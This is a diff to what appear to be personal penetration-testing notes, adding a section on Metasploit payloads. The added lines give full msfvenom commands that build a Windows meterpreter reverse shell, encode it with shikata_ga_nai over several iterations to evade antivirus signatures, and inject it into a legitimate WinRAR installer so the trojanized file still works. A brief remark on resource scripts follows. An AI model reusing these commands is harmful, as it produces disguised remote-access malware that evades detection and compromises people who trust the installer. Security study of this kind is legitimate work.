@@ -860,10 +860,20 @@ With an anonymous null session you can access the IPC$ share and interact with s
   
   ### Encoding Payloads with msfvenom
   - encoding helps to avoid signature av detection!
-    
+  - x86/shikata_ga_nai encoder for windows and linux executables is excellent! (this will work on 64 and 32 bit!)
+  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/felix/encoded.exe
+  - you can do more iterations of encoding by specifying "-i 10" (after LPORT) 
+  
+  ### Injecting Payloads into windows portable executables
+  
+  - we can utilize the msfvenom -x option to inject it into an legitimate portable executable (e.g. winrar) (use the -k option also to maintain the functionality!
+  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /home/felix/downlaods/winrar602.exe > /home/felix/winrar_injected.exe
   
   
-  
+  ## Automating Metasploit with Resource Scriopts
+  - Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands
+  - quite similar to batch scripts where you can specify a set of msfconsole commands that you want to execute sequentially
+  - skipped this.. read a manual to create resource scripts. :)
   
   
   
